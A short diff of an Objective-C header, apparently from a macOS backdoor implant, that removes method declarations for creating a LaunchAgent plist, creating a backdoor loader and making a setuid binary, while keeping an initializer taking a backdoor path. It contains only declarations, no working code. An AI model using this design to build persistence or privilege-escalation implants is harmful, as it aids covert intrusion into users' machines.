@@ -17,25 +17,11 @@
 {
 @private
   NSString *mBackdoorPath;
-  NSString *mServiceLoaderPath;
 }
 
-- (id)initWithBackdoorPath: (NSString *)aBackdoorPath
-             serviceLoader: (NSString *)aServiceLoaderPath;
+- (id)initWithBackdoorPath: (NSString *)aBackdoorPath;
 
 - (void)dealloc;
-
-- (BOOL)createLaunchAgentPlist: (NSString *)aLabel;
-
-- (BOOL)createBackdoorLoader;
-
-- (BOOL)makeSuidBinary: (NSString *)aBinary;
-
-- (NSString *)mBackdoorPath;
-- (void)setBackdoorPath: (NSString *)aValue;
-
-- (NSString *)mServiceLoaderPath;
-- (void)setServiceLoaderPath: (NSString *)aValue;
 
 @end
 
